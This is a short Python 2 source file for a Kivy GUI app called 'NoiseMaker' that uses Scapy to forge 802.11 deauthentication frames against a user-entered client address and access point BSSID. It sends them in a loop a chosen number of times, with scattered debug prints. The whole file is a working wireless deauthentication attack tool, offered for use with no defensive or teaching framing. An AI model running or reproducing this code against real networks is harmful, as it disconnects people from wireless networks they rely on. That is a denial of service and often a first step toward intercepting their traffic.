import sys
from scapy.all import *

import kivy
kivy.require("1.9.0")
from kivy.app import App
from kivy.uix.gridlayout import GridLayout

class NoiseMakerFunc(GridLayout):
    def SendPacket (self):  
        print "Function is called"
        try:
            print "one"
            client = self.ids.target.text
            nssid = self.ids.ssid.text
            count = self.ids.decount.text
            conf.iface = str(self.ids.iface.text)
            print client + ":" + count + ":" + nssid + ":" + conf.iface
            conf.verb = 0
            print "two"
            packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=nssid,addr3=nssid)/Dot11Deauth(reason=7)
            print "three"
            for n in range(int(count)):
                try:
                    print "four"
                    sendp(packet)
                    print "four point five"
                    print 'Deauth sent via: ' + conf.iface + ' to BSSID: ' + nssid + ' for Client: ' + client
                    print "five"
                except Exception, d:
                    print d
        except Exception, c:
            self.ids.resultOutput.text = "Error"
            print c
                
class NoiseMakerApp(App):

    def build(self):
        return NoiseMakerFunc()
    
NoiseMaker = NoiseMakerApp()
NoiseMaker.run()